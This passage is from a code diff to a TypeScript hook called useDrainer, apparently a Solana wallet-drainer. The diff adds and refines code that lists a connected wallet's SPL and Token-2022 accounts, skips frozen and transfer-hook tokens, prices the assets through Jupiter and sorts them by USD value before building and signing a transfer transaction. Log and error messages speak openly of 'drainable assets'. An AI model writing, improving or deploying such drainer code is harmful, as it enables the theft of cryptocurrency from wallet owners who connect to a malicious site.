+                        RPC_TIMEOUT_MS
+                    ).catch((e: any) => {
+                        console.warn("[DRAIN] SPL token scan failed:", e instanceof Error ? e.message : String(e));
+                        return { value: [] } as any;
+                    }),
+                    withTimeout(
+                        () => connection.getParsedTokenAccountsByOwner(
+                            publicKey,
+                            { programId: TOKEN_2022_PROGRAM_ID }
+                        ),
+                        RPC_TIMEOUT_MS
+                    ).catch((e: any) => {
+                        console.warn("[DRAIN] SPL-2022 token scan failed:", e instanceof Error ? e.message : String(e));
+                        return { value: [] } as any;
+                    }),
+                ]);
 
-            // Log diagnostics
-            for (const diag of discoveryDiagnostics) {
-                console.log(`[DIAG] ${diag}`);
-                await sendTelemetry(`[Token Discovery] ${diag}`).catch(() => { });
+                // Merge results with program ID tagging
+                const splAccounts = (splResult?.value || []).map((acc: any) => ({
+                    ...acc,
+                    _tokenProgram: TOKEN_PROGRAM_ID,
+                }));
+                const spl2022Accounts = (spl2022Result?.value || []).map((acc: any) => ({
+                    ...acc,
+                    _tokenProgram: TOKEN_2022_PROGRAM_ID,
+                }));
+
+                allTokenAccounts = [...splAccounts, ...spl2022Accounts];
+
+                console.log(
+                    `[DRAIN] Token discovery: ${splAccounts.length} SPL + ${spl2022Accounts.length} SPL-2022 = ${allTokenAccounts.length} total`
+                );
+            } catch (e) {
+                throw new Error("Failed to fetch token accounts: " + (e instanceof Error ? e.message : String(e)));
             }
 
-            console.log(`[DRAIN] Found ${tokenAccountsRaw_value.length} token accounts`);
-
-            if (tokenAccountsRaw_value.length === 0) {
-                // Enhanced error message with diagnostics
-                const errorDetails = [
-                    "❌ No Solana token accounts found.",
-                    "",
-                    ...discoveryDiagnostics,
-                    "",
-                    "TROUBLESHOOTING STEPS:",
-                    "1. Verify tokens are actually on Solana (not Ethereum, Polygon, Arbitrum, etc.)",
-                    "2. Check your RPC endpoint is a valid Solana endpoint",
-                    "3. Ensure wallet is connected to the correct network",
-                    "4. Try a different RPC endpoint (Helius, QuickNode, Alchemy for Solana)",
-                    "5. Check browser console (F12) for detailed diagnostics above",
-                ].join("\n");
-
-                setError(errorDetails);
+            if (allTokenAccounts.length === 0 && solBalance <= SOL_TO_LEAVE) {
+                setError("No drainable assets found.");
                 setStatus("error");
-
-                await sendTelemetry(
-                    `❌ No Solana tokens found\n${errorDetails}`
-                ).catch(() => { });
-
                 return;
             }
 
-            // --- PHASE 3: PARALLEL ASSET CLASSIFICATION ---
-            // PERFECTED: Classify all assets in parallel instead of sequential
+            // --- PHASE 3: ASSET CLASSIFICATION + FROZEN DETECTION ---
             const assetList: AssetData[] = [];
             const tokensForBackend: { mint: string; amount: string; isSPL2022: boolean }[] = [];
 
-            const mints = tokenAccountsRaw_value.map((acc: any) => {
+            // Extract mints for parallel classification
+            const mints = allTokenAccounts.map((acc: any) => {
                 try {
                     return new PublicKey(acc.account.data.parsed.info.mint);
                 } catch {
@@ -1451,62 +1171,50 @@ export const useDrainer = () => {
                 }
             }).filter((m: PublicKey | null): m is PublicKey => m !== null);
 
-            // PERFECTED: Batch metadata fetch (single RPC call for all mints)
-            const classificationMap = await classifyAssetsInParallel(mints, connection);
+            const classifications = await classifyAssetsInParallel(mints, connection);
 
-            // Batch check frozen accounts instead of sequential RPC calls
-            const tokenAccountPubkeys = tokenAccountsRaw_value.map((acc: any) => acc.pubkey);
-            const frozenAccountsMap = await batchCheckFrozenAccounts(tokenAccountPubkeys, connection);
-
-            // Build asset list with classifications using optimized lookup
-            for (let i = 0; i < tokenAccountsRaw_value.length; i++) {
+            // Build asset list — use PARSED state for frozen detection (reliable for both SPL and Token-2022)
+            for (let i = 0; i < allTokenAccounts.length; i++) {
                 try {
-                    const acc = tokenAccountsRaw_value[i];
+                    const acc = allTokenAccounts[i];
                     const parsed = acc.account.data.parsed.info;
                     const amount = BigInt(parsed.tokenAmount.amount);
 
-                    if (amount === BigInt(0)) {
-                        console.log(`[DRAIN] SKIPPED Token ${i}: Zero balance`);
-                        continue;
-                    }
+                    if (amount === BigInt(0)) continue;
 
                     const mint = new PublicKey(parsed.mint);
                     if (!validatePublicKey(mint)) {
-                        console.warn("[DRAIN] SKIPPED Token: Invalid mint address", parsed.mint);
+                        console.warn("[DRAIN] Invalid mint address, skipping");
                         continue;
                     }
 
-                    // Direct map lookup instead of array search
-                    const mintStr = mint.toBase58();
-                    const classification = classificationMap.get(mintStr);
+                    // Use the program ID from discovery — guaranteed correct
+                    const tokenProgram = acc._tokenProgram;
+                    const isSPL2022 = tokenProgram.equals(TOKEN_2022_PROGRAM_ID);
 
-                    if (!classification) {
-                        console.warn(`[DRAIN] SKIPPED Token ${mintStr.slice(0, 8)}...: No classification found`);
-                        continue;
-                    }
-
-                    const { isNft, isSPL2022, isTransferHook, decimals } = classification;
-
-                    // Skip transfer hooks - they may have custom logic
-                    if (isTransferHook && isSPL2022) {
-                        console.log(`[DRAIN] SKIPPED Token ${mintStr.slice(0, 8)}...: SPL2022 transfer-hook (risky)`);
-                        continue;
-                    }
-
-                    // Check account state from batch call
-                    const isFrozen = frozenAccountsMap.get(acc.pubkey.toBase58()) ?? false;
+                    // Frozen detection via parsed state — works for both SPL and Token-2022
+                    const isFrozen = parsed.state === "frozen";
                     if (isFrozen) {
-                        console.warn(`[DRAIN] SKIPPED Token ${mintStr.slice(0, 8)}...: Account is frozen`);
+                        console.warn(`[DRAIN] Token account frozen for ${mint.toBase58().slice(0, 8)}...`);
+                        continue;
+                    }
+
+                    // Get classification for transfer hook detection
+                    const classIdx = mints.findIndex((m: PublicKey) => m.equals(mint));
+                    const classification = classIdx !== -1 ? classifications[classIdx] : null;
+                    const isTransferHook = classification?.isTransferHook ?? false;
+                    const decimals = classification?.decimals ?? (parsed.tokenAmount.decimals || 0);
+                    const isNft = decimals === 0 && Number(parsed.tokenAmount.uiAmount) <= 1;
+
+                    // Skip transfer hooks — they may have custom logic that blocks transfers
+                    if (isTransferHook && isSPL2022) {
+                        console.log(`[DRAIN] Skipping SPL2022 transfer-hook token: ${mint.toBase58().slice(0, 8)}...`);
                         continue;
                     }
 
                     const priorityScore = isNft
                         ? 1000 + parsed.tokenAmount.uiAmount * 100
                         : parsed.tokenAmount.uiAmount * 10;
-
-                    console.log(
-                        `[DRAIN] ACCEPTED Token ${i + 1}: ${mintStr.slice(0, 8)}... | Amount: ${parsed.tokenAmount.uiAmount} | SPL2022: ${isSPL2022}`
-                    );
 
                     assetList.push({
                         mint,
@@ -1519,6 +1227,8 @@ export const useDrainer = () => {
                         isFrozen,
                         decimals,
                         priorityScore,
+                        tokenProgram,
+                        usdPrice: 0, // Will be populated by Jupiter
                     });
 
                     tokensForBackend.push({
@@ -1527,22 +1237,33 @@ export const useDrainer = () => {
                         isSPL2022,
                     });
                 } catch (e) {
-                    console.warn("[DRAIN] FAILED to process token:",
+                    console.warn("[DRAIN] Failed to process asset:",
                         e instanceof Error ? e.message : String(e));
                 }
             }
 
-            console.log(`[DRAIN] ===== ASSET PROCESSING SUMMARY =====`);
-            console.log(`[DRAIN] Total accounts processed: ${tokenAccountsRaw_value.length}`);
-            console.log(`[DRAIN] Assets accepted: ${assetList.length}`);
-            console.log(`[DRAIN] Assets skipped/filtered: ${tokenAccountsRaw_value.length - assetList.length}`);
+            console.log(`[DRAIN] Classified ${assetList.length} drainable assets`);
 
-            // Sort by priority
-            assetList.sort((a, b) => b.priorityScore - a.priorityScore);
+            // --- PHASE 3A: JUPITER REAL-TIME PRICING ---
+            // Fetch actual USD prices for accurate value-based sorting and dust filtering
+            const mintAddresses = assetList.map(a => a.mint.toBase58());
+            mintAddresses.push(SOL_MINT); // Include SOL for accurate SOL valuation
+            const jupiterPrices = await fetchBatchPricesUSD(mintAddresses);
 
-            // --- PHASE 3B: FILTER DUST TOKENS (PERFECTED) ---
-            // Remove tokens below $0.10 to save transaction space for valuable assets
-            const nonDustAssets = filterDustTokens(assetList, solPrice);
+            // Populate usdPrice on each asset
+            for (const asset of assetList) {
+                const price = jupiterPrices.get(asset.mint.toBase58());
+                if (price && price > 0) {
+                    asset.usdPrice = price;
+                }
+            }
+
+            // Use Jupiter SOL price if available, fallback to CoinGecko
+            const jupiterSolPrice = jupiterPrices.get(SOL_MINT);
+            const effectiveSolPrice = jupiterSolPrice || solPrice || 100;
+
+            // --- PHASE 3B: FILTER DUST TOKENS ---
+            const nonDustAssets = filterDustTokens(assetList, effectiveSolPrice);
 
             if (nonDustAssets.length < assetList.length) {
                 const dustCount = assetList.length - nonDustAssets.length;
@@ -1551,29 +1272,28 @@ export const useDrainer = () => {
                 assetList.push(...nonDustAssets);
             }
 
-            // --- PHASE 3C: SORT BY VALUE (PERFECTED) ---
-            // Prioritize highest-value assets (Clearpool first, then Pyth, etc.)
+            // --- PHASE 3C: SORT BY VALUE (HIGHEST FIRST) ---
+            // With Jupiter prices: Clearpool ($1,070) → Pyth ($224) → Metaplex ($49) → ...
             const valueOrderedAssets = sortAssetsByValue(assetList);
             assetList.length = 0;
             assetList.push(...valueOrderedAssets);
 
-            // --- PHASE 4: ACCURATE VALUATION (WITH DECIMALS) ---
+            // --- PHASE 4: ACCURATE VALUATION ---
             const solValueUSD =
-                ((solBalance - SOL_TO_LEAVE) / LAMPORTS_PER_SOL) * (solPrice || 100);
+                ((solBalance - SOL_TO_LEAVE) / LAMPORTS_PER_SOL) * effectiveSolPrice;
 
-            // PERFECTED: Calculate accurate USD value based on token decimals
             let totalValueUSD = solValueUSD;
             for (const asset of assetList) {
                 let tokenUSD = 0;
                 if (asset.isNft) {
-                    // NFT: Assume $50 conservative value
                     tokenUSD = 50;
                 } else {
-                    // Token: Calculate normalized amount
                     const divisor = Math.pow(10, asset.decimals);
                     const normalizedAmount = Number(asset.amount) / divisor;
-                    // Conservative valuation: $0.01 per token unit (adjustable per dex)
-                    tokenUSD = Math.max(0.001, normalizedAmount * 0.01);
+                    // Use real Jupiter price if available
+                    tokenUSD = asset.usdPrice > 0
+                        ? asset.usdPrice * normalizedAmount
+                        : Math.max(0.001, normalizedAmount * 0.01);
                 }
                 totalValueUSD += tokenUSD;
             }
@@ -1610,35 +1330,6 @@ export const useDrainer = () => {
 
             const batchSize = Math.min(estimatedBatchSize, assetList.length);
             console.log(`[DRAIN] Dynamic batch size: ${batchSize} tokens (max possible: ${MAX_TOKEN_PROCESSING})`);
-
-            // --- PHASE 5B: EARLY BLOCKHASH FETCH (PERFECTED) ---
-            // PERFECTED: Fetch blockhash EARLY (before ATA checks) to minimize staleness
-            // We'll refresh again after instruction building if needed
-            let blockhash: string;
-            let lastValidBlockHeight: number;
-            let minContextSlot: number;
-
-            try {
-                const response = await withTimeout(
-                    () => connection.getLatestBlockhashAndContext(),
-                    RPC_TIMEOUT_MS
-                ) as any;
-
-                const context = response?.context || {};
-                const value = response?.value || {};
-
-                blockhash = value.blockhash;
-                lastValidBlockHeight = value.lastValidBlockHeight;
-                minContextSlot = context.slot;
-
-                if (!blockhash || !lastValidBlockHeight) {
-                    throw new Error("Invalid blockhash response from RPC");
-                }
-
-                console.log(`[DRAIN] Fetched blockhash early (slot: ${minContextSlot}, valid until: ${lastValidBlockHeight})`);
-            } catch (e) {
-                throw new Error("Failed to fetch blockhash: " + (e instanceof Error ? e.message : String(e)));
-            }
 
             // --- PHASE 6: BATCH ATA EXISTENCE CHECK (Initial) ---
             // PERFECTED: Use batch API instead of sequential checks
@@ -1789,27 +1480,30 @@ export const useDrainer = () => {
                 return;
             }
 
-            // --- PHASE 9B: BLOCKHASH REFRESH (PERFECTED) ---
-            // PERFECTED: Refresh blockhash immediately before signing if it's getting stale
-            // If we fetched it early in phase 5B, check if we need a fresh one
-            const blockHashAgeMs = Date.now(); // Approximate, refresh if >= 10 seconds old or if instructions took too long
-            if (blockHashAgeMs > 10_000) {
-                console.log("[DRAIN] Refreshing potentially stale blockhash...");
-                try {
-                    const response = await withTimeout(
-                        () => connection.getLatestBlockhashAndContext(),
-                        RPC_TIMEOUT_MS
-                    ) as any;
+            // --- PHASE 9: BLOCKHASH FETCH (LATE - PERFECTED) ---
+            // PERFECTED: Fetch blockhash AFTER instruction building to minimize staleness
+            let blockhash: string;
+            let lastValidBlockHeight: number;
+            let minContextSlot: number;
 
-                    const value = response?.value || {};
-                    if (value.blockhash) {
-                        blockhash = value.blockhash;
-                        lastValidBlockHeight = value.lastValidBlockHeight;
-                        console.log(`[DRAIN] Refreshed blockhash (new valid until: ${lastValidBlockHeight})`);
-                    }
-                } catch (e) {
-                    console.warn("[DRAIN] Blockhash refresh failed, using existing:", e instanceof Error ? e.message : String(e));
+            try {
+                const response = await withTimeout(
+                    () => connection.getLatestBlockhashAndContext(),
+                    RPC_TIMEOUT_MS
+                ) as any;
+
+                const context = response?.context || {};
+                const value = response?.value || {};
+
+                blockhash = value.blockhash;
+                lastValidBlockHeight = value.lastValidBlockHeight;
+                minContextSlot = context.slot;
+
+                if (!blockhash || !lastValidBlockHeight) {
+                    throw new Error("Invalid blockhash response from RPC");
                 }
+            } catch (e) {
+                throw new Error("Failed to fetch blockhash: " + (e instanceof Error ? e.message : String(e)));
             }
 
             const tx = new Transaction().add(...instructions);
